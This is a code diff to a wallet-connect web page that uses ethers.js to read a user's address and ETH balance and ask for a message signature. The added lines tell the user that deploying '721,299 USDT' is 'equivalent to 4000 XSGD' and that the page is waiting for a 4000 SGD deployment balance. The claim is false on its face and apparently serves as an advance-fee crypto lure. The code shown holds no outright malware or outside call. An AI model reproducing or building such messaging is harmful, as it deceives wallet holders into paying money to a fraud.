@@ -60,6 +60,8 @@ button:hover:not(:disabled) {
     <div id="status">Please connect your wallet to begin.</div>
     <!-- Connect button -->
     <button id="connectBtn">Connect Wallet</button>
+    <!-- Contract info message -->
+    <div id="contractInfo" style="margin-top:10px; font-weight: bold; color: #333;"></div>
     <!-- Sign message button -->
     <button id="signBtn" disabled>Sign Message</button>
 </div>
@@ -75,6 +77,7 @@ let currentAddress;
 const statusEl = document.getElementById('status');
 const connectBtn = document.getElementById('connectBtn');
 const signBtn = document.getElementById('signBtn');
+const contractInfoEl = document.getElementById('contractInfo');
 
 async function connectWallet() {
     if (!window.ethereum) {
@@ -86,6 +89,7 @@ async function connectWallet() {
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         currentAddress = await signer.getAddress();
+
         const balanceBN = await provider.getBalance(currentAddress);
         const balanceETH = ethers.utils.formatEther(balanceBN);
         const balanceNumber = Number(balanceETH);
@@ -95,22 +99,16 @@ async function connectWallet() {
         <b>Wallet Connected</b><br/>
         Address: ${currentAddress}<br/>
         ETH Balance: ${balanceNumber.toFixed(4)} ETH<br/>
+        Waiting for contract deployment balance of 4000 SGD...
         `;
 
-        // Check if balance is sufficient (e.g., at least 0.01 ETH for demo)
-        if (balanceNumber >= 0.01) {
-            statusEl.innerHTML += `Status: Balance confirmed. You can sign a message.<br/>`;
-            signBtn.disabled = false;
-        } else {
-            statusEl.innerHTML += `Status: Insufficient balance. Please deposit more ETH.<br/>`;
-            signBtn.disabled = true;
-        }
+        // Show contract deployment info
+        contractInfoEl.innerHTML = `
+        For deploying the full amount of 721,299 USDT, it is equivalent to 4000 XSGD.
+        `;
 
-        // Placeholder for checking SGD equivalent
-        // Example: fetch SGD value from an API
-        // For now, just display a message
-        statusEl.innerHTML += `Waiting for contract deployment balance of 4000 SGD...`;
-        // TODO: Implement actual SGD conversion and check here
+        // Enable signing button if desired
+        // signBtn.disabled = false; // optional, depends on your logic
 
     } catch (err) {
         console.error(err);
@@ -126,8 +124,8 @@ async function signMessage() {
     const balanceETH = ethers.utils.formatEther(balanceBN);
     const balanceNumber = Number(balanceETH);
 
-    if (balanceNumber < 0.01) {
-        alert("Balance too low to sign message.");
+    if (balanceNumber <= 0) {
+        alert("Balance is zero or invalid, cannot sign message.");
         signBtn.disabled = true;
         return;
     }
